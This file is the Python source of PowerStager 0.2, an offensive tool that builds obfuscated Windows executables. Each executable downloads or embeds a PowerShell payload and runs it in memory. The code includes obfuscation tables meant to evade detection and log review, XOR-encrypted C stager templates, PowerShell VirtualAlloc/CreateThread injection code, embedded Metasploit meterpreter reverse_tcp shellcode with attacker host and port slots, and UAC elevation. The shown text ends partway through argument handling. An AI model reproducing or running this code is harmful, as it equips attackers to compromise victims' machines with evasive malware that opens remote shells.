#!/usr/bin/env python3
import os
import sys
import getopt
import string
import random
import base64
import hashlib

# Help notes and description
help_notes = """
  PowerStager 0.2
  ---------------
  Created by: z0noxz
  https://github.com/z0noxz/powerstager

  Description:
  This script creates an executable stager that downloads a selected powershell
  payload, loads it into memory and executes it using obfuscated EC methods.
  The script will also encrypt the stager for dynamic signatures and some
  additional obfuscation.

  This enables the actual payload to be executed indirectly without the victim
  downloading it, only by executing the stager. The attacker can then for
  example implement evasion techniques on the web server, hosting the payload,
  instead of in the stager itself.

  Additional methods allows the payload to be embedded into the 'stager' and
  temporarily stored encrypted on disk for memory injection.

  Not only are powershell powerful when managing Windows, it's also powerful
  when exploiting Windows. This script exploits multiple Windows features such
  as its inherit trust of powershell, interpretation of shorthand syntaxes,
  code evaluation and more...

  Program dependencies:
  * i686-w64-mingw32-gcc    ([_CHECK_i686_])
  * x86_64-w64-mingw32-gcc  ([_CHECK_x86_64_])

  Usage: powerstager [options]

  Options:
    -h, --help              Show this help message and exit. (duh)

    Method:
    One of these options has to be provided to define the method
      -u, --url=URL         Payload URL for online staging
      -p, --path=PATH       Payload path for embedded staging
      -m, --meterpreter     embedded meterpreter staging (reverse_tcp)
                            \033[96m--path and --meterpreter will dump\033[0m
                            \033[96mthe payload to disk temporary\033[0m

    Mandatory:
      -o, --output=PATH     File output for generated executable
      -t, --target=NAME     Platform target win32/win64

    Meterpreter:
    Mandatory options if the meterpreter method is selected, otherwise ignored
      --lhost=LHOST         Listener host IP address (e.g. 13.37.13.37)
      --lport=LPORT         Listener port (e.g. 4444)

    Optional:
      --listener            Automatically starts a meterpreter listener
      -g, --generate        Only outputs the --url ready payload
      -e, --use-elevation   Implementation of privilage elevation (using UAC)
                            \033[96melevation only works with --url\033[0m

  Note:
  \033[91mAll powershell activity will be logged in Windows event log.\033[0m
"""

# Placeholder values for powershell blocks with obfuscation techniques
obfuscation = {
	"[_OBF_NEW_OBJECT_]"			: "&(`G`C`M *w-O*)",
	"[_OBF_ADD_TYPE_]"				: "&(`G`C`M *d-T*e)",
	"[_OBF_SLEEP_]"					: "&(`G`C`M sl*p)",
	"[_OBF_WEB_CLIENT_]"			: {
										"text"			: "net.webclient",
										"escapable"		: True,
										"string"		: True
									},
	"[_OBF_DOWNLOAD_STRING_]"		: {
										"text"			: "downloadstring",
										"escapable"		: True,
										"string"		: True
									},
	"[_OBF_CHAR_]"					: {
										"text"			: "char",
										"escapable"		: False,
										"string"		: False
									},
	"[_OBF_BYTE_]"					: {
										"text"			: "byte",
										"escapable"		: False,
										"string"		: False
									},
	"[_OBF_VOID_]"					: {
										"text"			: "void",
										"escapable"		: False,
										"string"		: False
									},
	"[_OBF_INTPTR_]"				: {
										"text"			: "intptr",
										"escapable"		: False,
										"string"		: False
									},
	"[_OBF_JOIN_]"					: {
										"text"			: "join",
										"escapable"		: False,
										"string"		: False
									},
	"[_OBF_BXOR_]"					: {
										"text"			: "bxor",
										"escapable"		: False,
										"string"		: False
									},
	"[_OBF_SV_]"					: {
										"text"			: "sv",
										"escapable"		: True,
										"string"		: False
									},
	"[_OBF_GV_]"					: {
										"text"			: "gv",
										"escapable"		: True,
										"string"		: False
									},
	"[_OBF_VALUE_]"					: {
										"text"			: "value",
										"escapable"		: True,
										"string"		: True
									},
	"[_OBF_LENGTH_]"				: {
										"text"			: "length",
										"escapable"		: True,
										"string"		: True
									},
	"[_OBF_START_]"					: {
										"text"			: "start",
										"escapable"		: True,
										"string"		: False
									},
	"[_OBF_TO_STRING_]"				: {
										"text"			: "tostring",
										"escapable"		: True,
										"string"		: True
									},
	"[_OBF_TO_B64_STRING_]"			: {
										"text"			: "tobase64string",
										"escapable"		: True,
										"string"		: True
									},
	"[_OBF_UNICODE_]"				: {
										"text"			: "unicode",
										"escapable"		: True,
										"string"		: True
									},
	"[_OBF_GET_BYTES_]"				: {
										"text"			: "getbytes",
										"escapable"		: True,
										"string"		: True
									},
	"[_OBF_AS_]"					: {
										"text"			: "as",
										"escapable"		: False,
										"string"		: False
									},
	"[_OBF_POWERSHELL_]"			: {
										"text"			: "powershell",
										"escapable"		: True,
										"string"		: False
									},
	"[_OBF_VIRTUAL_ALLOC_]"			: {
										"text"			: "virtualalloc",
										"escapable"		: True,
										"string"		: True
									},
	"[_OBF_MAX_]"					: {
										"text"			: "max",
										"escapable"		: True,
										"string"		: True
									},
	"[_OBF_MEMSET_]"				: {
										"text"			: "memset",
										"escapable"		: True,
										"string"		: True
									},
	"[_OBF_CREATE_THREAD_]"			: {
										"text"			: "createthread",
										"escapable"		: True,
										"string"		: True
									},
}

# Normal C source for decryption and process execution through system() call
c_source = """#include <stdlib.h>

int main(int argc, char *argv[])
{
	int [_VAR_X_];
	char [_VAR_STR_][] = {[_VAL_STR_]};
	char [_VAR_KEY_][] = {[_VAL_KEY_]};
	for ([_VAR_X_] = 0; [_VAR_X_] < sizeof([_VAR_STR_]) / sizeof([_VAR_STR_][0]); [_VAR_X_]++)
	{
		[_VAR_STR_][[_VAR_X_]] = [_VAR_STR_][[_VAR_X_]] ^ [_VAR_KEY_][[_VAR_X_] % sizeof([_VAR_KEY_])];
	}

	system([_VAR_STR_]);

	return 0;
}
"""

# C source for XOR decryption and process execution of embedded code through system() call
c_source_embedded = """#define _CRT_SECURE_NO_DEPRECATE
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
	int [_VAR_X_];
	char [_VAR_PATH_][256];
	const char* [_VAR_TEMP_] = getenv("TEMP");
	snprintf([_VAR_PATH_], 255, "%s\\\\[_TMP_FILENAME_]", [_VAR_TEMP_]);

	FILE *[_VAR_FILE_] = fopen([_VAR_PATH_], "wb");
	if ([_VAR_FILE_] == NULL) { exit(1); }

	char [_VAR_STR_EMB_][] = {[_VAL_STR_EMB_]};
	char [_VAR_KEY_EMB_][] = {[_VAL_KEY_EMB_]};
	for ([_VAR_X_] = 0; [_VAR_X_] < sizeof([_VAR_STR_EMB_]) / sizeof([_VAR_STR_EMB_][0]); [_VAR_X_]++)
	{
		[_VAR_STR_EMB_][[_VAR_X_]] = [_VAR_STR_EMB_][[_VAR_X_]] ^ [_VAR_KEY_EMB_][[_VAR_X_] % sizeof([_VAR_KEY_EMB_])];
	}

	fwrite([_VAR_STR_EMB_], 1, sizeof([_VAR_STR_EMB_]), [_VAR_FILE_]);
	fclose([_VAR_FILE_]);

	char [_VAR_STR_STG_][] = {[_VAL_STR_STG_]};
	char [_VAR_KEY_STG_][] = {[_VAL_KEY_STG_]};
	for ([_VAR_X_] = 0; [_VAR_X_] < sizeof([_VAR_STR_STG_]) / sizeof([_VAR_STR_STG_][0]); [_VAR_X_]++)
	{
		[_VAR_STR_STG_][[_VAR_X_]] = [_VAR_STR_STG_][[_VAR_X_]] ^ [_VAR_KEY_STG_][[_VAR_X_] % sizeof([_VAR_KEY_STG_])];
	}

	system([_VAR_STR_STG_]);

	return 0;
}
"""

# Fairly obfuscated building blocks for powershell commands
powershell_blocks = {
	# The main part of the powershell blocks
	"main"			: "powershell -wi h -c \"[_OBF_START_] [_OBF_POWERSHELL_][_ELEVATION_] -wi h -a '-wi h -c \"\"[_PS_LOAD_]\"\"'\"",

	# Base64 decoder
	"base64decoder"	: "([Convert]::[_OBF_TO_B64_STRING_]([Text.Encoding]::[_OBF_UNICODE_].[_OBF_GET_BYTES_]([_PS_LOAD_])))",

	# XOR decryptor for file decryption
	"xordecryptor"	: "([[_OBF_CHAR_][]](([[_OBF_CHAR_][]][_PS_LOAD_])|%{$[_PS_XOR_I_]=0}{$_-[_OBF_BXOR_]'[_PS_XOR_KEY_]'[$[_PS_XOR_I_]++%[_PS_XOR_KEY_SIZE_]]})-[_OBF_JOIN_]'')",

	# System.Net.WebClient invoker
	"webclient"		: "([_OBF_NEW_OBJECT_][_OBF_WEB_CLIENT_]).[_OBF_DOWNLOAD_STRING_]([_URL_])",

	# Encoded command block or EC
	"ec"			: "[_OBF_SV_] [_PS_VAR_1_] [_PS_VAR_C45_A_];[_OBF_SV_] [_PS_VAR_2_] [_PS_VAR_C101_A_];[_OBF_SV_] [_PS_VAR_3_] [_PS_VAR_C99_A_];[_OBF_SV_] [_PS_VAR_4_](((([_OBF_GV_] [_PS_VAR_1_]).[_OBF_VALUE_]+[_PS_VAR_C45_B_])-[_OBF_AS_][[_OBF_CHAR_]]).[_OBF_TO_STRING_]()+((([_OBF_GV_] [_PS_VAR_2_]).[_OBF_VALUE_]+[_PS_VAR_C101_B_])-[_OBF_AS_][[_OBF_CHAR_]]).[_OBF_TO_STRING_]()+((([_OBF_GV_] [_PS_VAR_3_]).[_OBF_VALUE_]+[_PS_VAR_C99_B_])-[_OBF_AS_][[_OBF_CHAR_]]).[_OBF_TO_STRING_]());[_OBF_POWERSHELL_]([_OBF_GV_] [_PS_VAR_4_]).[_OBF_VALUE_].[_OBF_TO_STRING_]()[_PS_LOAD_]",

	# Memory injection block
	"injection"		: "IEX \"`$[_PS_WF_]=[_OBF_ADD_TYPE_] -m '[DllImport(`\"kernel32.dll`\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(`\"kernel32.dll`\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(`\"msvcrt.dll`\")] public static extern IntPtr memset(IntPtr dest, uint src, uint count);' -name 'Win32' -ns Win32Functions -pas;[[_OBF_BYTE_][]]`$[_PS_VAR_PAYLOAD_]=[_PS_PAYLOAD_];`$[_PS_VAR_X_]=`$[_PS_WF_]::[_OBF_VIRTUAL_ALLOC_](0,[Math]::[_OBF_MAX_](`$[_PS_VAR_PAYLOAD_].[_OBF_LENGTH_],0x1000),0x3000,0x40);for(`$[_PS_VAR_I_]=0;`$[_PS_VAR_I_] -le (`$[_PS_VAR_PAYLOAD_].[_OBF_LENGTH_]-1);`$[_PS_VAR_I_]++){[[_OBF_VOID_]]`$[_PS_WF_]::[_OBF_MEMSET_]([[_OBF_INTPTR_]](`$[_PS_VAR_X_].ToInt[_PS_ARCHITECTURE_]()+`$[_PS_VAR_I_]),`$[_PS_VAR_PAYLOAD_][`$[_PS_VAR_I_]],1)};`$[_PS_WF_]::[_OBF_CREATE_THREAD_](0,0,`$[_PS_VAR_X_],0,0,0);[_OBF_SLEEP_]100000\""
}

# Payloads prepared for memory injection
powershell_payloads = {
	# metasploit stager for meterpreter. This also works with vncinjection on W7 (but fails on W10)
	"meterpreter"	: "0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,"
					+ "0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,"
					+ "0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,"
					+ "0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,"
					+ "0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,0x81,0x78,"
					+ "0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,"
					+ "0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,"
					+ "0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,"
					+ "0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,"
					+ "0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,"
					+ "0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,"
					+ "0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,"
					+ "0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,"
					+ "0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,"
					+ "0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,"
					+ "0x49,0xbc,0x02,0x00,[_LPORT_]," + "[_LHOST_]" + ",0x41,0x54,0x49,0x89,0xe4,0x4c,"    # << LPORT and LHOST gets declared here as 6 bytes
					+ "0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,0x01,0x01,"
					+ "0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x41,0x5e,0x50,"
					+ "0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,"
					+ "0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,"
					+ "0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,"
					+ "0x85,0xc0,0x74,0x0c,0x49,0xff,0xce,0x75,0xe5,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,"
					+ "0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,"
					+ "0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,"
					+ "0x6a,0x40,0x41,0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,"
					+ "0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,"
					+ "0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,"
					+ "0x5f,0xff,0xd5,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xe1,0x41,0xff,"
					+ "0xe7",
}

# Collision list for dynamic variable creation
collision_list = []


# Class for printing and styling text to terminal
class Print(object):

	name_value_list = []

	@staticmethod
	def text(text="", continuous=False):
		if continuous:
			sys.stdout.write("  " + text)
			sys.stdout.flush()
		else:
			print("  " + text)
		return len(text)

	@staticmethod
	def info(text="", continuous=False):
		return Print.text("\033[94m[i]\033[0m " + text, continuous)

	@staticmethod
	def warning(text="", continuous=False):
		return Print.text("\033[96m[!]\033[0m " + text, continuous)

	@staticmethod
	def status(text="", continuous=False):
		return Print.text("\033[94m[*]\033[0m " + text, continuous)

	@staticmethod
	def error(text="", continuous=False):
		return Print.text("\033[91m[-]\033[0m " + text, continuous)

	@staticmethod
	def success(text="", continuous=False):
		return Print.text("\033[92m[+]\033[0m " + text, continuous)

	@staticmethod
	def add_name_value(name="", value="", func=None):
		Print.name_value_list.append({"name": name, "value": value, "func": func})

	@staticmethod
	def name_value_print():
		for line in Print.name_value_list:
			(line["func"] if line["func"] is not None else Print.text)(line["name"] + (" " * (len(max(Print.name_value_list, key=lambda x: len(x["name"]))["name"]) - len(line["name"]) + 4)) + ": " + line["value"])
		Print.name_value_list = []


# Checks if program is installed and executable
def which(program):

	def is_exe(fpath):
		return os.path.isfile(fpath) and os.access(fpath, os.X_OK)

	fpath, fname = os.path.split(program)
	if fpath:
		if is_exe(program):
			return program
	else:
		for path in os.environ["PATH"].split(os.pathsep):
			path = path.strip('"')
			exe_file = os.path.join(path, program)
			if is_exe(exe_file):
				return exe_file

	return None


# Integer to binary converter
def binarray(n):
	while n:
		yield n & 0xff
		n = n >> 8


# Creates dynamic variable names while checking for name collisions
def dynamic_variable():
	global collision_list

	holder = ""

	while holder == "" or holder in collision_list:
		holder = "_" + "".join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(random.randint(6, 12)))

	collision_list.append(holder)
	return holder


# Binary formater for lhost & lport in meterpreter injection
def _lformat(lhost, lport):
	try:
		lhost = lhost.split(".")
		lhost = [int(byte) for byte in lhost]
		lhost = [byte for byte in lhost if byte >= 0 and byte <= 255]
		lport = int(lport)
		if len(lhost) == 4 and lport > 0 and lport <= 65535:
			return ",".join(hex(b) for b in (list(binarray(lport))[::-1] + list(binarray(lhost[0])) + list(binarray(lhost[1])) + list(binarray(lhost[2])) + list(binarray(lhost[3]))))
	except:
		Print.error("There is something wrong with the LHOST and LPORT")
	sys.exit(2)


# Compiler for c-source
def compile(source, output, target):

	temp_name = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10)) + ".c"

	with open(temp_name, "w") as temp_file:
		temp_file.write(source)

	if (
		target == "win32"
		and (os.system("i686-w64-mingw32-gcc -mwindows -o " + output + " " + temp_name + " && /bin/rm -f " + temp_name) == 0)
	) or (
		target == "win64"
		and (os.system("x86_64-w64-mingw32-gcc -mwindows -o " + output + " " + temp_name + " && /bin/rm -f " + temp_name) == 0)
	):
		Print.add_name_value("File signature", hashlib.md5(open(output, "rb").read()).hexdigest(), Print.info)
		Print.add_name_value("Payload generated", output, Print.success)
		return

	Print.add_name_value("Failed to generate", output, Print.error)
	os.system("/bin/rm -f " + temp_name)


# Powershell ready base64 encoder
def ps_base64encode(data):
	return base64.b64encode(data.encode("UTF-16LE")).decode("utf-8", "ignore")


# Replaces nth occurrence (maybe overkill as the only call is for first occurrence)
def replaceNth(subject, source, target, n):
	indices = [index for index in range(len(subject) - len(source) + 1) if subject[index:index + len(source)] == source]
	if len(indices) < n:
		return subject
	subject = list(subject)
	subject[indices[n - 1]:indices[n - 1] + len(source)] = target
	return ''.join(subject)


# Obfuscates powershell code in accordance with some standard rules
def ps_obf(data, top=False, escape_quotes=False):
	global obfuscation

	clone = data
	for key, value in obfuscation.items():
		if (type(value) is dict):
			while clone.count(key) > 0:
				sub = list(value["text"])

				for i in range(len(sub)):
					if random.getrandbits(1):
						sub[i] = sub[i].upper()

					if (value["escapable"] and value["string"] and not top) or (value["escapable"] and not value["string"]):
						if random.getrandbits(1):
							if sub[i] in ["a", "b", "f", "n", "r", "t", "v"]:
								sub[i] = sub[i].upper()
							sub[i] = "`" + sub[i]

				sub = "".join(sub)

				if value["string"] and not top:
					sub = "(\"" + sub + "\")"

					# Used inside injection payloads
					if escape_quotes:
						sub = sub.replace("`", "``")
						sub = sub.replace("\"", "`\"")

				clone = replaceNth(clone, key, sub, 0)
		else:
			clone = clone.replace(key, value)

	return "".join(clone)


# Generates main powershell block
def gen_main(load, elevation=False):
	global powershell_blocks

	return ps_obf(powershell_blocks["main"]).replace(
		"[_ELEVATION_]", (" -v runas" if elevation else "")
	).replace(
		"[_PS_LOAD_]", load
	)


# Generates EC (EncodedCommand) powershell block, with some extra obfuscation totally avoiding "-EC"
# However, I have noticed the powershell engine still interpreting this as -EC... so not 100% stealthy
def gen_ec(load, top=False):
	global powershell_blocks

	c45 = random.randint(0, 45)
	c101 = random.randint(0, 101)
	c99 = random.randint(0, 99)

	return ps_obf(powershell_blocks["ec"], top).replace(
		"[_PS_VAR_1_]", dynamic_variable()
	).replace(
		"[_PS_VAR_2_]", dynamic_variable()
	).replace(
		"[_PS_VAR_3_]", dynamic_variable()
	).replace(
		"[_PS_VAR_4_]", dynamic_variable()
	).replace(
		"[_PS_VAR_C45_A_]", str(c45)
	).replace(
		"[_PS_VAR_C45_B_]", str(45 - c45)
	).replace(
		"[_PS_VAR_C101_A_]", str(c101)
	).replace(
		"[_PS_VAR_C101_B_]", str(101 - c101)
	).replace(
		"[_PS_VAR_C99_A_]", str(c99)
	).replace(
		"[_PS_VAR_C99_B_]", str(99 - c99)
	).replace("[_PS_LOAD_]", load)


# Generates base64 decoder powershell block
# The idea is that this + EC will simulate an (IEX + webclient) call 
# without calling the IEX at all... so looking for IEX in the logs won't help you here
def gen_base64_decoder(url):
	global powershell_blocks

	return gen_ec(
		ps_obf(powershell_blocks["base64decoder"]).replace(
			"[_PS_LOAD_]", gen_webclient("+".join("'" + x + "'" for x in url))
		)
	)


# Generates XOR decryptor powershell block
# This is used for all payloads being temporary stored on disk
def gen_xor_decryptor(url, key):
	global powershell_blocks

	return ps_obf(powershell_blocks["xordecryptor"]).replace(
		"[_PS_LOAD_]", gen_webclient(url)
	).replace(
		"[_PS_XOR_I_]", dynamic_variable()
	).replace(
		"[_PS_XOR_KEY_]", key
	).replace(
		"[_PS_XOR_KEY_SIZE_]", str(len(key))
	)


# Generates webclient powershell block
def gen_webclient(url):
	global powershell_blocks

	return ps_obf(powershell_blocks["webclient"]).replace("[_URL_]", url)


# Generates memory injection powershell block
# Used for example with injection of a meterpreter stager into memory
def gen_injection(payload, architecture):
	global powershell_blocks

	return ps_obf(powershell_blocks["injection"], False, True).replace(
		"[_PS_MEMB_]",
		dynamic_variable()
	).replace(
		"[_PS_VAR_PAYLOAD_]",
		dynamic_variable()
	).replace(
		"[_PS_WF_]",
		dynamic_variable()
	).replace(
		"[_PS_VAR_X_]",
		dynamic_variable()
	).replace(
		"[_PS_VAR_I_]",
		dynamic_variable()
	).replace(
		"[_PS_ARCHITECTURE_]",
		"64" if architecture == "win64" else "32"
	).replace(
		"[_PS_PAYLOAD_]",
		payload
	)


# Generates injection payload powershell block
# Generates injection payloads either from templates or from path
def gen_injection_payload(_ag):
	global powershell_payloads

	# Create an empty holder for an embedded payload
	payload_embedded = ""

	# Check what to generate
	if (("path" in _ag) and (_ag["path"] != "")):
		with open(_ag["path"], "r") as _file:
			payload_embedded = ps_base64encode(_file.read())
	elif ("meterpreter" in _ag):
		payload_embedded = ps_base64encode(
			gen_injection(
				powershell_payloads["meterpreter"].replace(
					"[_LPORT_],[_LHOST_]",
					_lformat(_ag["lhost"], _ag["lport"])
				), _ag["target"]
			)
		)

	if ("generate" in _ag):
		with open(_ag["output"], "w") as dump:
			dump.write(gen_ec(payload_embedded))
		Print.add_name_value("File signature", hashlib.md5(open(_ag["output"], "rb").read()).hexdigest(), Print.info)
		Print.success("Payload generated   : " + _ag["output"])
		sys.exit()

	return payload_embedded


# Generates source
def gen_source(_ag):
	global c_source, c_source_embedded

	if (("url" in _ag) and (_ag["url"] != "")):

		val_key = []
		val_str = [
			ord(x) for x in gen_main(
				gen_ec(
					ps_base64encode(
						gen_base64_decoder(_ag["url"])
					), True
				), "use-elevation" in _ag
			)
		]

		for i in range(len(val_str)):
			val_key.append(random.randint(0, 255))
			val_str[i] = val_str[i] ^ val_key[i]

		Print.add_name_value("Payload size", str(len(val_str)) + " bytes", Print.info)

		return c_source.replace(
			"[_VAR_STR_]",
			dynamic_variable()
		).replace(
			"[_VAL_STR_]",
			",".join(str(x) for x in val_str) + ",0"		# append \0 for zero termination (0 xor 0 equals 0)
		).replace(
			"[_VAR_KEY_]",
			dynamic_variable()
		).replace(
			"[_VAL_KEY_]",
			",".join(str(x) for x in val_key) + ",0"		# append \0 for zero termination (0 xor 0 equals 0)
		).replace(
			"[_VAR_X_]",
			dynamic_variable()
		)
	else:

		# Generate a temporary file name for later use
		remote_tmp_file = dynamic_variable()
		encryption_key = "".join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for x in range(random.randint(24, 48)))

		Print.add_name_value("Temp file", remote_tmp_file, Print.info)
		Print.add_name_value("Encryption key", encryption_key, Print.info)

		val_key = []
		val_str = [
			ord(x) for x in gen_main(
				gen_ec(
					ps_base64encode(
						gen_ec(
							gen_xor_decryptor(
								"$env:temp+'\\" + remote_tmp_file + "'",
								encryption_key
							)
							# Remove temp file (note no plus-sign after temp)
							+ (";Remove-Item $env:temp'\\" + remote_tmp_file + "'")
						)
					), True
				)
			)
		]

		val_key_emb = []
		val_str_emb = [ord(x) for x in gen_injection_payload(_ag)]

		for i in range(len(val_str)):
			val_key.append(random.randint(0, 255))
			val_str[i] = val_str[i] ^ val_key[i]

		# Initial encryption with generated key
		for i in range(len(val_str_emb)):
			val_str_emb[i] = val_str_emb[i] ^ ord(encryption_key[i % len(encryption_key)])

		# Second encryption with stored key
		for i in range(len(val_str_emb)):
			val_key_emb.append(random.randint(0, 255))
			val_str_emb[i] = val_str_emb[i] ^ val_key_emb[i]

		Print.add_name_value("Payload size", str(len(val_str)) + " bytes", Print.info)
		Print.add_name_value("Embedded size", str(len(val_str_emb)) + " bytes", Print.info)

		return c_source_embedded.replace(
			"[_VAR_PATH_]",
			dynamic_variable()
		).replace(
			"[_VAR_TEMP_]",
			dynamic_variable()
		).replace(
			"[_TMP_FILENAME_]",
			remote_tmp_file
		).replace(
			"[_VAR_FILE_]",
			dynamic_variable()
		).replace(
			"[_VAR_STR_STG_]",
			dynamic_variable()
		).replace(
			"[_VAL_STR_STG_]",
			",".join(str(x) for x in val_str) + ",0"		# append \0 for zero termination (0 xor 0 equals 0) when using strings ONLY
		).replace(
			"[_VAR_KEY_STG_]",
			dynamic_variable()
		).replace(
			"[_VAL_KEY_STG_]",
			",".join(str(x) for x in val_key) + ",0"		# append \0 for zero termination (0 xor 0 equals 0) when using strings ONLY
		).replace(
			"[_VAR_STR_EMB_]",
			dynamic_variable()
		).replace(
			"[_VAL_STR_EMB_]",
			",".join(str(x) for x in val_str_emb)
		).replace(
			"[_VAR_KEY_EMB_]",
			dynamic_variable()
		).replace(
			"[_VAL_KEY_EMB_]",
			",".join(str(x) for x in val_key_emb)
		).replace(
			"[_VAR_X_]",
			dynamic_variable()
		)


# Print program header in terminal
def print_header():
	Print.text("\033[38;5;160m" + r"   ___                       __ _                        " + "\033[0m")
	Print.text("\033[38;5;161m" + r"  / _ \_____      _____ _ __/ _\ |_ __ _  __ _  ___ _ __ " + "\033[0m")
	Print.text("\033[38;5;162m" + r" / /_)/ _ \ \ /\ / / _ \ '__\ \| __/ _` |/ _` |/ _ \ '__|" + "\033[0m")
	Print.text("\033[38;5;163m" + r"/ ___/ (_) \ V  V /  __/ |  _\ \ || (_| | (_| |  __/ |   " + "\033[0m")
	Print.text("\033[38;5;164m" + r"\/    \___/ \_/\_/ \___|_|  \__/\__\__,_|\__, |\___|_|   " + "\033[0m")
	Print.text("\033[38;5;130m" + r"   _ __  _   _                           " + "\033[38;5;164m|___/\033[38;5;130m           " + "\033[0m")
	Print.text("\033[38;5;131m" + r"  | '_ \| | | |                                          " + "\033[0m")
	Print.text("\033[38;5;132m" + r" _| |_) | |_| |  A payload stager using PowerShell       " + "\033[0m")
	Print.text("\033[38;5;133m" + r"(_) .__/ \__, |  Created by z0noxz                       " + "\033[0m")
	Print.text("\033[38;5;134m" + r"  |_|    |___/                                           " + "\033[0m")


def main(argv):
	global help_notes

	_ag = {}

	print_header()

	help_notes = help_notes.replace("[_CHECK_i686_]", "\033[92mpresent\033[0m" if which("i686-w64-mingw32-gcc") else "\033[91mmissing\033[0m")
	help_notes = help_notes.replace("[_CHECK_x86_64_]", "\033[92mpresent\033[0m" if which("x86_64-w64-mingw32-gcc") else "\033[91mmissing\033[0m")

	try:
		opts, args = getopt.getopt(
			argv,
			"hu:p:mo:t:eg",
			[
				"help",
				"url=",
				"path=",
				"meterpreter",
				"output=",
				"target=",
				"lhost=",
				"lport=",
				"use-elevation",
				"listener",
				"generate",
			]
		)
	except getopt.GetoptError as e:
		print(help_notes)
		Print.error(str(e))
		sys.exit(2)
	for opt, arg in opts:
		if opt in ("-h", "--help"):
			print(help_notes)
			sys.exit()
		elif opt in ("-u", "--url"):
			_ag["url"] = arg
		elif opt in ("-p", "--path"):
			_ag["path"] = arg
		elif opt in ("-m", "--meterpreter"):
			_ag["meterpreter"] = arg
		elif opt in ("-o", "--output"):
			_ag["output"] = arg
		elif opt in ("-t", "--target"):
			_ag["target"] = arg
		elif opt in ("--lhost"):
			_ag["lhost"] = arg
		elif opt in ("--lport"):
			_ag["lport"] = arg
		elif opt in ("-e", "--use-elevation"):
			_ag["use-elevation"] = arg
		elif opt in ("--listener"):
			_ag["listener"] = True
		elif opt in ("-g", "--generate"):
			_ag["generate"] = arg

	Print.text("")

	if (not which("i686-w64-mingw32-gcc")) or (not which("x86_64-w64-mingw32-gcc")):
		Print.error("mingw does not seem to be installed on your system")
		sys.exit(2)

	if (("url" not in _ag) or (_ag["url"] == "")) and (("path" not in _ag) or (_ag["path"] == "")) and ("meterpreter" not in _ag):
		Print.error("A method parameter is missing, or empty")
		sys.exit(2)
	elif not (("url" not in _ag) or (_ag["url"] == "")) and not (("path" not in _ag) or (_ag["path"] == "")) and not ("meterpreter" not in _ag):
		Print.error("Only one method parameter is allowed")
		sys.exit(2)
	elif not (("url" not in _ag) or (_ag["url"] == "")):
		Print.add_name_value("URL", _ag["url"], Print.info)
	elif not (("path" not in _ag) or (_ag["path"] == "")):
		Print.add_name_value("PATH", _ag["path"], Print.info)
	elif ("meterpreter" in _ag):
		if (("lhost" in _ag) and (_ag["lhost"] != "")) and (("lport" in _ag) and (_ag["lport"] != "")):
			Print.add_name_value("Shell listener", _ag["lhost"] + ":" + _ag["lport"], Print.info)
		else:
			Print.error("LHOST and LPORT must be specified when generating a meterpreter payload")
			sys.exit(2)
